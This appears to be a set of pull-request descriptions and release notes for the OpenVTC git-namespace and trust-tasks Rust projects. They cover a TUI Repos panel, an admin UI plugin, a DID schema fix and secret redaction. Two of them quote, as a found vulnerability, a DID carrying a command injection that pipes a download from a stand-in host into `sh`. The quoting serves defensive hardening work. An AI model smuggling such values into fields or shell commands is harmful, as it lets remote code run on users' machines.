The member side of **VTC Git Namespaces**: a **Repos** panel in the TUI, per community, and the `git-ns/*` client behind it in `openvtc-core`. Design: `vtc-git-namespaces-design.md` §7.2 (with §4.2, §4.4, §5.2, §6). Normative: trustoverip/dtgwg-trust-tasks-tf `specs/git-ns/**`; where the design and the specs differ, the specs are followed (for example `account/link` + `account/link-status` rather than the design's `git-ns/github/link`).

> **Depends on OpenVTC/verifiable-trust-infrastructure#1694** (draft, `feat/vtc-gitns`) for the server side. Until that ships in a VTC, opening the panel against a community fails closed with "no reply within 30s — the community's VTC may be offline, or may not serve git namespaces yet", or with `unsupportedType` explained as "this community does not serve git namespaces".

### `openvtc-core::git_ns`
- `Request` for the eight member tasks: view, repo/create, right/grant, right/revoke, repo/transfer, repo/archive, account/link, account/link-status. Payloads are built only through the generated `trust_tasks_rs::specs::git_ns` types, so a value the schema refuses fails before sending, naming the field.
- `build_signed`: every document is addressed, dated and signed by the persona (six tasks declare the proof REQUIRED; view and link-status RECOMMENDED; the VTC takes the actor from the verified signer). Carriage is the DIDComm binding envelope, which VTI #1694 routes through the spine.
- `parse_reply`: typed responses by thread; a response off the schema is reported as a contract mismatch, not dropped; `trust-task-error` becomes a `Refusal` whose `explain()` gives every declared code a fix (tested for all of them), and tells apart authorisation, proof, contract mismatch, unavailable and the VTC's admin-only stand-in for step-up (R6.4).
- Pure readings of a view: my repos with my strongest right (implied rights included), creatable namespaces, people on a repo, creation progress, drift.

### TUI: Repos panel (`r` from Communities, Active rows)
- **My repos**: right badge and status (`ok`, `drift (n)`, `checking`, `creating n/6`, `archived`, `orphaned`), and "You can create repos in … (granted by …)".
- **New repo**: only with `repo.create`. Manual namespaces and personal accounts say no bot can create there; the steps the VTC answers with are shown on the repo.
- **Repo view**: creation steps while pending, drift, and people and rights. `a` add person: pick from the people you can see, or Ctrl+D to paste a DID for an external signer. You choose a right, expiry and reason; the Trust Registry publication is spelled out, and a `policyDenied` is shown in the form. `x` revoke, `t` transfer (to the highlighted person), `A` archive.
- **Consent**: owner grants, transfers, archives and every removal are armed and sent only on `y`, labelled with the design §6 class. The VTC may still refuse an elevated change from a non-admin (`[git_ns] elevated_requires_admin`), and the TUI explains that refusal as such.
- **Forge account**: `l` links on a bridge-served forge. GitHub shows the device URL and `userCode`; Forgejo shows the URL and a QR. `link-status` is polled every 5 s, bounded by the attempt's `expiresAt`.
- **Commit signing**: shows whether did-git-sign is set up for this persona. It also checks the global commit-msg hook: current, OUTDATED ("fix: re-run `did-git-sign init`"), newer, foreign or missing. The check runs off the loop thread.
- Sends run in their own `GitNs` dispatch domain, with a 30 s reply window and one outstanding request at a time. A refresh cannot take the slot of a grant that is still waiting. After a change lands, the view is re-read.

### Dependencies (first commit)
Main (#378) already moved the stack to vta-sdk 0.51 / trust-tasks 0.22 / messaging-sdk 0.27, so this PR only adds:
- `trust-tasks-rs` 0.22.2 → **0.22.3 with the `git-ns` feature**, which is where the generated `git-ns/*` types are. It is a patch move on the same line.
- `did-git-sign` 0.4.13 → **0.4.14**, which publishes `init::commit_msg_hook_status` / `COMMIT_MSG_HOOK_VERSION` (VGI #72). The signing-health row calls these directly instead of copying the hook-marker check. 0.4.14 is on the same vta-sdk 0.51 line, so `cargo tree -d` still shows one vta-sdk, one trust-tasks-rs, one messaging-sdk and one affinidi-tdk.

No crate `version =` fields were edited.

## Gaps found (spec / VTC / upstream)
- **`git-ns/view` 0.1 reports no forge-account bindings for the caller.** trust-tasks-rs 0.22.4 adds view 0.2, which carries them. It is not taken here, because the VTC serves only view 0.1 until its follow-up to #1694.
  Until then, the account row can show only a link made in this session. Suggest adding the caller's own `accounts` to the view response.
- **There is no member-facing member directory.** The add-person picker offers the DIDs the view already names. Anyone else is added by pasting a DID.
- **The VTC has no member step-up on the signed path.** By default (`elevated_requires_admin`), only a community administrator can grant `own`, transfer or archive. The TUI's confirmation is local consent, not the design's step-up.
- **did-git-sign has no hook classifier that takes a path.** The global `core.hooksPath` check reads the version line off the library's own `COMMIT_MSG_HOOK`. A public `classify_commit_msg_hook(path)` upstream would remove that.
- **The capability view's reply path does not check the sender either.** It is separate code (`apply_capability_replies`), matched on thread id only, and was not changed here.
- **The hook check resolves from the TUI's working directory.** It honours `core.hooksPath` at every scope, or the global one when not in a repository. A per-repository install is visible only if openvtc is started inside that repository.
- **Creation progress is derived from the record.** "n/6" counts: name reserved, forge id present, and the four bootstrap flags. The mockup's "owner on the forge" step has no field in the view.

## Tests
- core: payloads vs the spec examples through the generated types, schema refusals, signing/addressing, consent classes, reply parsing (typed, unreadable, refusals), an explanation for every declared code, framework-code separation, view readings.
- TUI: reducer flows (navigation, new-repo form, add-person picker and external mode, revoke/transfer/archive arming and gating), outcome application (pending, failure, community mismatch), reply application (view, grant, policyDenied in-form, notGranted as success, manual create steps, elevated gate), link flow (device code, 5 s floor, expiry, linked remembered), reply timeout, the pending guard, hook classification, key map and paste, and render checks.
- `cargo fmt --check`, `cargo clippy --workspace --all-targets -D warnings` (and `--features dev-overrides`), `cargo test --workspace` (default and `--no-default-features`), `RUSTDOCFLAGS=-D warnings cargo doc`, and `cargo deny check`: all green locally.

## Pre-merge checklist (vti-stack-development-guide §9)
- [x] No new reqwest::Client::new() / bare fetch(); all clients have finite timeouts (R1.2): no HTTP clients were added; DIDComm sends go through the existing path, and every reply has a 30 s window.
- [x] No lock held across a network await (R1.3)
- [x] No local state committed before its remote effect (R2.1): nothing is persisted, and the view is re-read after each change.
- [x] Every retry is bounded + backed off; non-idempotent ops are not blind-retried (R1.4): only `link-status` (a read) is polled, at ≥5 s, until its expiry; changes are never retried automatically.
- [x] Accept/poll/listen loops survive transient errors (R1.5): a failed poll is retried on the next tick.
- [x] Acks/deletes happen only after durable handoff (R1.6): N/A
- [x] New/changed wire types (R3.*): all come from the generated spec types; no hand-written payloads.
- [x] Config absence = most restrictive (R5.*): with no view there is no action, and an unknown hook state is reported as unknown.
- [x] Logs/status claim only what was verified (R6.*): "awaiting the community's reply" is shown until the answer arrives, and send, refusal and contract-mismatch failures are told apart.
- [x] "Process dies on the next line" answered for every mutation touched (R2.1): all state is in memory and the VTC is the record.
- [x] Deviations flagged: none.

## Review follow-ups (commit 08b9c0e)
- All VTC-supplied text is now sanitised; the sanitiser lives in `openvtc_core::display`.
- A reply is accepted only if both its sender and its issuer are the community's VTC.
- A link attempt appears only after its request is actually sent, and `account/link` has a 60 s reply window.
- A link URL must be https on the link's own forge.
- Signing health checks both scopes (where openvtc was started, and the global `core.hooksPath`) with paths, leads with the worse, and detects a repository-local install.
- Status lines carry an explicit severity and colour.
- Only `y` confirms an armed change.
- After a timeout the form stays open, marked "may have been applied".
- A create answered after you have moved on no longer navigates.
- My repos sorts strongest right first.
- Hint text is corrected, and the tests are stronger.

title: feat(tui): Repos panel for community git namespaces (member side of git-ns) (#377)
body:
feat(tui): Repos panel for community git namespaces (member side of git-ns) (#377)

* chore(deps): trust-tasks-rs 0.22.3 with git-ns, and did-git-sign 0.4.14

The Repos panel speaks the git-ns/* Trust Task family, whose generated
types first ship in trust-tasks-rs 0.22.3 behind the non-default
`git-ns` feature. It is a patch move on the 0.22 line vta-sdk 0.51 is
already on, so nothing else follows it.

did-git-sign 0.4.14 publishes `init::commit_msg_hook_status` and
`COMMIT_MSG_HOOK_VERSION` (verifiable-git-infrastructure #72), which the
panel's signing-health row reads instead of re-implementing the hook's
version marker. It is on the same vta-sdk 0.51 line as 0.4.13, so the
graph still holds one vta-sdk.

Signed-off-by: Glenn Gore <glenn.g@affinidi.com>

* feat(core): a git-ns client for the member side of git namespaces

`openvtc_core::git_ns` sends the eight member-facing `git-ns/*` Trust
Tasks to a community's VTC — view, repo/create, right/grant,
right/revoke, repo/transfer, repo/archive, account/link and
account/link-status — and reads their answers.

Every payload is built through the generated
`trust_tasks_rs::specs::git_ns` types, so a value the schema refuses (an
unqualified resource, a DID without a method, an over-long reason) fails
before anything is sent, naming the field. Every document is addressed,
dated and signed by the persona: six of the tasks declare the proof
REQUIRED, and the two reads declare it RECOMMENDED; the VTC takes the
actor from the verified signer. Carriage is the DIDComm binding envelope,
as for the capability tasks.

Replies are parsed into typed responses keyed by thread. A response off
the schema is reported as a contract mismatch rather than dropped, and a
`trust-task-error` becomes a `Refusal` whose `explain()` gives each
declared code the fix it implies — `lastOwner` says to add another owner
first, `policyDenied` keeps the VTC's reason and points at the
community's policy, and the VTC's admin-only stand-in for step-up reads
as that rather than as a missing right. Framework codes are told apart
per R6.4.

Pure readings of a view back the TUI: the member's repositories with
their strongest right (implied rights included), where they may create,
the people on a repository, creation progress and drift.

Signed-off-by: Glenn Gore <glenn.g@affinidi.com>

* feat(tui): a Repos panel for a community's git repositories

`r` on an Active community opens it, mirroring the capabilities view:
every read and change is one signed `git-ns/*` task sent off the loop in
its own dispatch domain, the answer is matched by thread id on the
inbound channel, and after any change the view is read again.

- My repos: each repository the member holds a right on, the strongest
  right as a badge, and its status — ok, drift, checking, creating n/6,
  archived, orphaned.
- New repo, offered only with `repo.create`: namespace, name, visibility,
  description. A manual namespace or personal account says no bot can
  create there, and the steps the community answers with are shown on the
  repository.
- A repository: its creation steps while it is being made, its drift,
  and its people and rights. `a` adds a person — picked from the people
  the member can see, or a pasted DID for an outside contributor — with a
  right, an expiry and a reason; a `policyDenied` is shown in the form.
  `x` revokes, `t` transfers the member's ownership, `A` archives.
  Owner grants, transfers, archives and every removal are armed and sent
  only on `y`, labelled with their consent class.
- Forge account: `l` links a GitHub account (device code and URL) or a
  Forgejo one (URL and QR), polling `link-status` every five seconds until
  it settles or lapses.
- Commit signing: whether did-git-sign is set up for the persona, and
  whether the commit-msg hook is current, outdated ("re-run did-git-sign
  init"), someone else's, or missing — as did-git-sign's own
  `commit_msg_hook_status` reports it, off the loop thread.

One request awaits an answer at a time, so a refresh cannot take the
slot of a grant still in flight; replies have a 30 s window.

Signed-off-by: Glenn Gore <glenn.g@affinidi.com>

* fix(repos): review follow-ups — sender checks, sanitising, link and signing health

- Every string the VTC supplies is sanitised before it is drawn or kept:
  DIDs and names, reasons, forge logins and ids, device codes, link URLs,
  manual steps, drift details, and a refusal's code and message. The
  sanitiser moves to `openvtc_core::display::sanitize_display` so core
  cleans a refusal's text the same way the TUI does.
- A git-ns reply is applied only when its transport sender and its
  document issuer are both the community the view is asking; a correctly
  threaded answer from anyone else is dropped.
- A link attempt is shown only once its `account/link` is actually sent;
  a refused send says why instead of leaving "starting…" forever.
  `account/link` gets a 60 s reply window (the VTC waits 30 s on its
  bridge first); everything else stays at 30 s.
- A link URL is shown, or drawn as a QR code, only if it is https on the
  link's own forge.
- Signing health checks both the hook for where openvtc was started (via
  did-git-sign's `commit_msg_hook_status`) and the global core.hooksPath,
  reports each with the file looked at, and leads with the worse. The
  install is looked for in the global config and the repository's
  `.did-git-sign.json`, so a repository-only install is not "not set up".
- Status lines carry an explicit severity; refusals, timeouts and link
  failures are drawn in the error colour.
- Only `y` confirms an armed change.
- After a timeout the form stays, marked "may have been applied —
  refresh"; a create answered after the member moved on does not
  navigate.
- My repos sorts strongest right first, then by name, as documented; the
  add-person hint names Ctrl+D.
- Tests: the schema-refusal test asserts the field; the signing test
  verifies the proof and its assertionMethod purpose.

Signed-off-by: Glenn Gore <glenn.g@affinidi.com>

title: docs(vtc): step-up on a signed document is bound to the operation (#1641)
body:
A design note for the first of the two blockers #1641 names: the verbs gated on
a live passkey gesture — `acl/grant` and `acl/change-role` to admin, and
console-key enrolment — cannot move onto the signed door, because the step-up
is recorded on a session and a signed document has none.

Decided with the maintainer: the step-up a signed document needs is **bound to
the one operation** by payload digest and elevates nothing. The gate parks the
document and answers `stepUpRequired` with a challenge and a challenge-salted
wire digest; the admin answers with a user-verified passkey assertion
(`auth/step-up/approve-response`, `evidence.webauthn`, `boundTo`); the re-sent
document redeems that single-use mark (300 s). One gesture, one act, on every
transport. A console key can sign and redeem but never create a mark.

Not taken: reading the admin's live session (console-signing §6f, now marked
superseded). A document names no session, and a session elevation reached from
the signed door is the defect the VTA deleted as "delegated step-up" — one
approval admitting every act for fifteen minutes, which §6g's script would spend.

The note also covers VTI-APV-014, a separate gap on both doors: creating or
widening an unrestricted admin entry needs consent from another party, which
the VTC does not ask. It reuses the published `task-consent/*` ceremony, keyed
on the same payload digest as the step-up; the threshold is configurable per
community (default and minimum 1) and refused at write time when unmeetable.
The one-admin bootstrap edge is answered by an optional co-admin at install
and an offline break-glass.

Upstream first: VTI-APV-003 must admit operation-bound re-authentication, and
`approve-response` must allow a `boundTo` answer without a `sessionId`.

title: trust-tasks-rs-v0.22.6
body:
### Added

- **git-ns**: Hold every DID to the W3C DID Core syntax ([#629](https://github.com/trustoverip/dtgwg-trust-tasks-tf/pull/629))

The family's shared `Did` pattern, `^did:[a-z0-9]+:\S+$`, accepted
  anything without whitespace after the method: shell metacharacters,
  quotes, backticks, `/`, `?` and `#`. A security review found that
  `did:web:x.example$(curl${IFS}-s${IFS}evil.example|sh)` validated as a
  right's subject and later reached a copyable shell command in an admin
  UI.

  git-ns/_shared 0.3 narrows `Did` to a bare DID per DID Core 3.1:
  `did:`, a lowercase method name, and a method-specific id of
  colon-separated segments of `A-Z a-z 0-9 . - _` and percent-encoded
  octets, the last one non-empty. No path, query or fragment: every
  member typed `Did` names a party (subjects, owners, grantedBy, a
  transfer's `to`, a job's subjects), never a verification method. No
  other definition changes, and no DID-URL field in the family uses
  `Did`. The framework defines no DID pattern to reuse; issuer and
  recipient are unconstrained VIDs.

  Versioning. SPEC 6.6 item 1 requires a narrowed constraint in a shared
  schema component to be a new component version, so _shared/0.1 and
  0.2 are untouched. Item 3 couples adoption to a new version of each
  consuming specification, and the in-place rule of 5.2 covers only
  re-pins with no wire effect, so each latest spec version that carries
  a `Did` gets a new version. They are all draft, so the breaking
  narrowing ships as a MINOR increment under the draft allowance of 5.2:

    view 0.3, bridge/job 0.3, drift/resolve 0.2, namespace/reseat 0.2,
    repo/adopt 0.2, repo/archive 0.2, repo/create 0.2,
    repo/transfer 0.2, right/grant 0.2, right/revoke 0.2

  Each restates its predecessor with a "Changes from" section, pins
  _shared/0.3, and links to the newest versions of its siblings. The
  specs that carry no `Did` (account/*, bridge/event, bridge/result,
  namespace/bind, namespace/unbind) are unchanged.

  The six specs with a `Did` in the request gain invalid examples: shell
  metacharacters, whitespace, a `#` fragment and an uppercase method
  (and, for bridge/job, a bad `desiredRoles[].subject`).

  Bindings regenerated for Rust, TypeScript, Go and Dart. In TypeScript
  the hoisted `SharedComponents.Did`, `RepoSummary` and `RightRecord` now
  exist in two shapes and take family/version-qualified names
  (`Did_GitNsV0_1`, `Did_GitNsV0_3`, ...), as in #508; each spec module
  still exports them under their own names.

| `trust_tasks` | pub.dev | `0.2.6` → `0.2.7` | patch |

What merging does, per registry (all in `publish.yml`, each keyed on "this
version is not published yet"):

- **crates.io** — `release-plz-release` tags `<crate>-v<version>`, publishes in
  dependency order and creates a GitHub Release per crate. Bump levels come from
  `cargo-semver-checks`.
- **npm** — `publish-npm` publishes with OIDC provenance and tags
  `<prefix>-v<version>`.
- **Go** — `publish-go` builds, vets and tests, then pushes the tag, which *is*
  the publication. **Irreversible**: proxy.golang.org never forgets a tag.
- **pub.dev** — `tag-dart` verifies against the *published* core and pushes the
  tag; `publish-dart.yml` publishes from it.

The npm, Go and Dart bumps are only as accurate as the commit subjects — nothing
checks their APIs the way `cargo-semver-checks` checks the crates. Look for a
missing `!` before merging.

This branch is regenerated from `main` on every push, so do not commit to it —
edits are force-pushed away. See RELEASING.md.

title: feat(vtc-admin-ui): Repos plugin for git namespaces
body:
Follows #1694 (merged). The git-ns admin API, console-key delegation and the new `cnm git` verbs it adds are what this renders and drives.

## What

- **`git-ns/drift/resolve` 0.1.** An owner (or a namespace admin over the repository) answers one reported drift item.
  - **adopt** records the forge-side role as the `git-ns/right/grant` it is, under the same fixed rules, policy and consent class.
  - **revert** has the bridge undo the forge-side change and changes no right.
  - Items are selected by `type`, by `account` for role items, and by `observed`, which is required to adopt.
  - A resolution removes the item from `sync.drift` and queues an `inspect`.
  - Every declared code is implemented and tested: `driftNotFound`, `notAdoptable`, `accountNotLinked`, `noMatchingRight`, `notRevertible`, plus `unknownNamespace`, `namespaceNotBound`, `unknownRepo`, `repoNotActive`, `policyDenied`, `permissionDenied` and `malformedRequest`.
- **`git-ns/bridge/job` 0.2.** Sent only for reverting a `roleAdded` item (`projectRoles` with `removeAccounts`).
  - It is sent in-line, so a bridge that implements only 0.1 and refuses it is answered `notRevertible` rather than reported as done.
  - Every other job is still sent as 0.1.
- **`git-ns/namespace/reseat` 0.1.** A community administrator grants a permanent `git.ns.admin` to a current member on a headless namespace.
  - The headless check and the grant happen under one hold of the store lock.
  - `notHeadless` is refused without naming the live admins.
  - The audit record keeps the statement and how each earlier admin record ended, without a departed member's DID in plaintext.
- **`git-ns/view` 0.2**, served beside 0.1: `accounts` returns the caller's own linked forge accounts, narrowed to the forge of `resource` when one is given, and never another member's.
- **`git-ns/bridge/event` 0.2** (trust-tasks #627), served beside 0.1 by one handler, since the payloads are wire-identical.
  - A transfer detaches the repository wherever `to` is.
  - An event with any resource outside its namespace, drift items included, is refused before anything is applied. A transfer's `to` is exempt.
- **cnm:** `cnm git drift resolve …` and `cnm git reseat …`. `cnm git view` now asks for view 0.2. vtc-client gains the matching methods.
- **Default policy:** `namespace.reseat` counts as receiving a right, so the default admits only members; `drift.revert` is documented.

## Choices to review

- The projected right of a forge role is the inverse of VGI's default `RoleMap`:
  - `admin` maps to `own` and `maintain` to `maintain`.
  - On a personal account, `write` maps to `maintain`.
  - `write` on an organisation, `triage` and `read` project nothing. The VTC is not told whether committers are given `write`.
- Reverting an `admin` role has the impact of revoking `own` (elevated). Every other revert has the impact of revoking `maintain`. Under the default `elevated_requires_admin`, an owner therefore needs a community administrator to revert an `admin` role.

## Checks

The CI-equivalent run passes locally: workspace tests, vtc-service/vtc-client tests, `clippy -D warnings` and `fmt --check`.

title: feat(vtc-admin-ui): Repos plugin for git namespaces (#1696)
body:
feat(vtc-admin-ui): Repos plugin for git namespaces (#1696)

* feat(vtc-admin-ui): Repos plugin for git namespaces

The admin console's view of the git namespaces #1694 adds: namespace
cards (kind, bridge or manual mode, installation state, admins, repo
creators, the bridge's Dependabot service grant, the active git namespace
policy), each namespace's repositories with the four-dot VGI bootstrap
indicator and a lifecycle-then-sync status with the action it needs
(resolve drift, assign an owner, adopt), a repository page (people x
rights with granter, expiry, departed-granter and external-signer flags;
the bootstrap checklist; the guard design section 9 expects; the Trust
Registry records it publishes, implied commit rights included; drift;
recent activity), namespace rights, the issued-by-departed-members
review, and the bind flow.

Every git-ns change is a signed Trust Task authorized by the signer's own
git rights, the daemon mounts no bearer route for any of them, and the
console cannot sign a document yet (#1641). So each action is built
exactly as it will be sent and handed to the administrator as the
`cnm git` command that signs it, and as the document itself where cnm has
no command (transfer, archive). The dialog states the task's design
section 6 consent class and how this VTC enforces it
(`elevated_requires_admin`) rather than running a passkey step-up that
would elevate a session the signed document never uses.

Reads go through the eight `/v1/git-ns/*` admin routes under the
`git-ns/view/0.1` Trust-Task header, typed from the generated wire.ts.

Signed-off-by: Glenn Gore <glenn.g@affinidi.com>

* feat(vtc-admin-ui): Repos sends signed git-ns tasks, shows bridge-reported status

Follows #1694's second pass.

- Changes are signed with this browser's console key and sent to
  /v1/trust-tasks where one is enrolled (#1695); git-ns now resolves the
  key's delegation to the operator's admin DID (#1692) and authorizes by
  that DID's git rights. Where the browser cannot sign, the task is handed
  over as before. A refused signed task is shown as refused, never
  retried; a destructive one must be confirmed before it is signed.
- cnm commands for transfer and archive, and a New repo action built on
  `cnm git create` / git-ns/repo/create; a personal-account create shows
  the account holder's steps.
- Namespace cards show the bridge's forge status when reported: missing
  App permissions, a pending permission upgrade, no org rulesets, the
  installation and App name. Nothing is claimed when it is absent. The
  effective role_drift and cascade_on_departure are shown.

  falls back to the design section 9 guard labelled as expected; plus
  per-step outcomes of the last create or bootstrap and the last check.
- Linked accounts come from GET /v1/git-ns/accounts and activity from
  GET /v1/git-ns/activity, replacing the derived versions.
- The console projections are read with no Trust-Task header, since only
  /v1/git-ns/view is gated on git-ns/view/0.1 now.

Signed-off-by: Glenn Gore <glenn.g@affinidi.com>

* fix(vtc-admin-ui): Repos matches the git-ns API as merged

- The registry preview mirrors `projection::desired_all`: a role-derived
  commit right inside a bound namespace is published by the git-ns
  projection, so it is listed there too.
- Rights, drift, the registry mirror, linked accounts and the departed
  review need a community administrator since #1694's review fixes; a 403
  on them now says so instead of showing the daemon's bare refusal.

Signed-off-by: Glenn Gore <glenn.g@affinidi.com>

* fix(vtc-admin-ui): keep git-ns document types out of the header census

trust_task_manifest pairs every Trust-Task URI literal in the console with
a route that enforces it. The git-ns task URIs are document types
dispatched by POST /v1/trust-tasks, with no route to bind them, and the
unused git-ns/view constant was a header no route binds as a literal.
Drop the constant and spell the document types from their family.

Signed-off-by: Glenn Gore <glenn.g@affinidi.com>

* fix(vtc-admin-ui): Repos review — quote every cnm argument, name the parties, honest reads

Review of #1696:

1. Every value in a `cnm git` command is shell-quoted (positionals) or
   bound to its flag as `--flag='value'`, so no DID, resource, id, name or
   free text can expand, split or be read as an option. didError follows
   DID Core syntax (method-name, idchar/pct-encoded segments, optional
   fragment). A table test runs every builder's command through `sh` with
   an injection payload and checks it arrives as one literal argument.
2. The signing dialog names the resource and every party (name and full
   DID) in its body; drift adoption shows the member a forge login
   resolves to by full DID.
3. Nothing is claimed from rights that are loading or unreadable (repo
   creators, the service grant, "nothing is published"); a 403 on the
   community-wide reads says a community administrator is needed.
4. Detached repositories (unbound namespace or moved out) are listed and
   shown as detached, not "never adopted"; namespaces get a destructive
   Unbind; the headless advice names git-ns/namespace/reseat
   (cnm git reseat) as coming, and unbind-and-rebind until then.
5. The expected guard respects forgeStatus.requiredWorkflow = false; an
   unrecognised reported guard is shown verbatim, not replaced.
6. Bind: only a successful send (or "I have sent it") starts watching;
   close, Escape and a refusal return to the form; "Back to the form"
   from the waiting step; next.url is called "continue on {forge}" only
   when its host is the forge.
7. SigningUnavailableError at send time has its own message and falls
   back to the terminal hand-over; expiry is 1..3650 whole days; reasons
   are at most 1024 characters; revoke takes an optional reason; the
   member picker pages at the listing's 200 limit with a filter.
8. trust_task_manifest gains a signed-document-type allowlist checked
   against git_ns::tasks::served_uris (now pub), replacing the join("/")
   spelling that dodged the header census.
9. Dialogs trap focus, return it to the opener, tie field errors with
   aria-describedby, and cannot be dismissed while a send is in flight.
10. Tests assert postSignedTrustTask is not called where nothing is sent,
    exactly once on a refusal; the vacuous departed-review check is gone.

title: feat(git-ns): hold every DID to the W3C DID Core syntax (#629)
body:
feat(git-ns): hold every DID to the W3C DID Core syntax (#629)

The family's shared `Did` pattern, `^did:[a-z0-9]+:\S+$`, accepted
anything without whitespace after the method: shell metacharacters,
quotes, backticks, `/`, `?` and `#`. A security review found that
`did:web:x.example$(curl${IFS}-s${IFS}evil.example|sh)` validated as a
right's subject and later reached a copyable shell command in an admin
UI.

git-ns/_shared 0.3 narrows `Did` to a bare DID per DID Core 3.1:
`did:`, a lowercase method name, and a method-specific id of
colon-separated segments of `A-Z a-z 0-9 . - _` and percent-encoded
octets, the last one non-empty. No path, query or fragment: every
member typed `Did` names a party (subjects, owners, grantedBy, a
transfer's `to`, a job's subjects), never a verification method. No
other definition changes, and no DID-URL field in the family uses
`Did`. The framework defines no DID pattern to reuse; issuer and
recipient are unconstrained VIDs.

Versioning. SPEC 6.6 item 1 requires a narrowed constraint in a shared
schema component to be a new component version, so _shared/0.1 and
0.2 are untouched. Item 3 couples adoption to a new version of each
consuming specification, and the in-place rule of 5.2 covers only
re-pins with no wire effect, so each latest spec version that carries
a `Did` gets a new version. They are all draft, so the breaking
narrowing ships as a MINOR increment under the draft allowance of 5.2:

  view 0.3, bridge/job 0.3, drift/resolve 0.2, namespace/reseat 0.2,
  repo/adopt 0.2, repo/archive 0.2, repo/create 0.2,
  repo/transfer 0.2, right/grant 0.2, right/revoke 0.2

Each restates its predecessor with a "Changes from" section, pins
_shared/0.3, and links to the newest versions of its siblings. The
specs that carry no `Did` (account/*, bridge/event, bridge/result,
namespace/bind, namespace/unbind) are unchanged.

The six specs with a `Did` in the request gain invalid examples: shell
metacharacters, whitespace, a `#` fragment and an uppercase method
(and, for bridge/job, a bad `desiredRoles[].subject`).

Bindings regenerated for Rust, TypeScript, Go and Dart. In TypeScript
the hoisted `SharedComponents.Did`, `RepoSummary` and `RightRecord` now
exist in two shapes and take family/version-qualified names
(`Did_GitNsV0_1`, `Did_GitNsV0_3`, ...), as in #508; each spec module
still exports them under their own names.

title: security(workspace): no type derives Debug over secret material
body:
A derived `Debug` prints every field, so on a type holding a private key, a
seed or mnemonic, a bearer or refresh token or a password it puts the secret
into anything that formats the value — a `tracing` field, an `unwrap` or
`expect` on an enclosing type, a test failure, a panic message. About 55 types
across twelve crates did exactly that. It surfaced when `vtc-client` began
holding an operator's key in a `HolderKey`, whose derived `Debug` printed it.

Each now has a hand-written `Debug` that reports the secret as `<redacted>` —
presence kept visible for an `Option` — and prints every other field as
before, the idiom the workspace already used where someone had thought of it.
Among them: `HolderKey`, `Session`, `ClientIdentity`, `CredentialBundle`,
`SecretEntry`, `AgentConfig`, `AgentConnect`, `AuthResult`, the key-import and
seed-rotation requests (mnemonic), `SeedRecord`, `MnemonicExportResponse`,
`SecretsConfig` (seed, Vault token, AppRole secret id), `VaultSecret`, its
`CustomField` values and secure notes, `TotpSeed`, the VTC install flow's
ephemeral signing keys, setup tokens and install JWT, the VTC backup's signing
bundle and password, mobile-core's X25519 and Ed25519 private keys, auth tokens
and push tokens (including the Web Push auth secret), and vta-mcp's
`--agent-key`/`--holder-key`/`--agent-secrets`.

`Zeroizing<T>` is not a redaction — its `Debug` prints the inner value — so the
fields wrapped in it were redacted too.

`vta-sdk/tests/secret_debug_census.rs` keeps the class closed. It parses every
workspace crate with `syn` and fails on a `#[derive(Debug)]` struct or enum
whose field has a secret-sounding name (`*_key`, `*token*`, `*secret*`,
`seed*`, `password`, `mnemonic`, `jwt`, and `secret_id` despite its `_id`)
and a raw type (`String`, bytes, `Zeroizing<_>`, optionally in an `Option` or
behind a reference). A field whose type is another workspace type inherits that
type's `Debug`, which is checked where it is defined. What the name rule
catches and is not a secret — a claim-type vocabulary token, a webvh path
called `mnemonic`, the name of an entry in a secret store — is on a
shrink-only list with what the field holds, and the census also refuses a
stale entry and a walk that has stopped finding types.

Not an API change: every type still implements `Debug`; only what it prints
differs, and no test asserted on the old output.

## Found beyond the census

The name rule is a net, not a proof. Review turned up secrets it cannot see by
name, and each is redacted by hand: `CustomField.value` (a vault's free-form
field, redacted whether or not it is marked `hidden`), the vault's
`secure_notes`, `PushRegistration::WebPush.auth` (the Web Push subscription
auth secret), `MintedInstallToken.jwt`, the refresh token riding
`AdminSessionRequest.ext`, and `agent_secrets` (inline `DidSecretsBundle` JSON)
in `AgentConnect` and vta-mcp. A reviewer adding a secret field under a
neutral name still has to redact it; the census catches the common names.

## Verified locally

- `cargo test --workspace --exclude vtc-service --exclude vtc-client --no-fail-fast`: all pass
- `cargo test -p vtc-service -p vtc-client --no-fail-fast`: all pass
- `cargo clippy --workspace --all-targets -- -D warnings`: clean, plus the three reduced-feature `vta-service` clippy runs
- `cargo fmt --all -- --check`: clean
- Census and `cargo check --workspace --all-targets` re-run after rebasing onto #1709 / #1710 / #1699

title: vta-service-v0.42.0
body:
### Fixed

- **vtc**: OpenAPI schema names are unique, so each endpoint documents its own shape ([#1697](https://github.com/OpenVTC/verifiable-trust-infrastructure/pull/1697)) ([#1701](https://github.com/OpenVTC/verifiable-trust-infrastructure/pull/1701))

utoipa keys `components.schemas` by bare type name, and
  `OpenApiRouter::routes` merges each route's schemas with a plain map
  `extend`, so two `ToSchema` types with one name fail nothing: the last
  registered wins and every `$ref` to the name describes that one. The VTC
  document had 18 such names across vtc-service and vta-sdk, and six were
  wrong in the published document — `GET /v1/admin/passkeys` was described
  as the console-key list, `/v1/auth/challenge` as the personhood challenge,
  and five revoke endpoints as the endorsement revoke response.

  - vtc-service: the service-side types get distinct names with
    `#[schema(as = …)]`. Rust type names are unchanged, so no handler moves
    and `openapi_response_census` still compares like with like.
  - vta-service: `RollbackResponse` and `EnrollPasskeyChallengeBody` were
    field-for-field copies of vta-sdk's types registered under the same
    names. The shapes matched, so the document happened to be right; the
    copies are deleted in favour of the vta-sdk types.
  - `openapi_schema_names.rs` in both services: a source-scan census that
    fails when two `ToSchema` definitions in the crate or its path
    dependencies share a schema name, and when the scan finds too few names
    to prove anything.
  - admin-ui: `openapi.json` and `wire.ts` regenerated; `PasskeyListResponse`
    restored as a generated alias and used by `myPasskeys.tsx` in place of
    the local interface that let the drift go unnoticed.



### Chore

- **deps**: Messaging-sdk 0.27.1 + trust-tasks-rs 0.22.3; answer a mutual TSP cancel the SDK could not (Keyring VTI-38) ([#1693](https://github.com/OpenVTC/verifiable-trust-infrastructure/pull/1693))

Raises the floors on top of #1690's 0.22.1 / 0.27.0 move: trust-tasks-rs and
  -proof to 0.22.3 (the git-ns family, enabled by all-specs; the rest of the
  trust-tasks-* line resolves to 0.22.3 too), affinidi-messaging-sdk to 0.27.1.
  The graph holds exactly one copy of each.

  `affinidi-messaging-sdk` becomes a workspace dependency (floor 0.27.1) in
  place of five hand-kept per-crate literals.

  SDK 0.27.1 answers a peer's §7.3 cancellation of a mutual relationship
  itself, and `reply_expected` now means "the answer is still owed", which is
  true only when that send failed. The VTA's and VTC's `handle_tsp_control`
  retried with `cancel_relationship`, which refuses `SendCancel` out of `None`
  (the relationship is already forgotten). That is the exact VTI-38 failure.
  They now use `TspOps::answer_cancellation`.
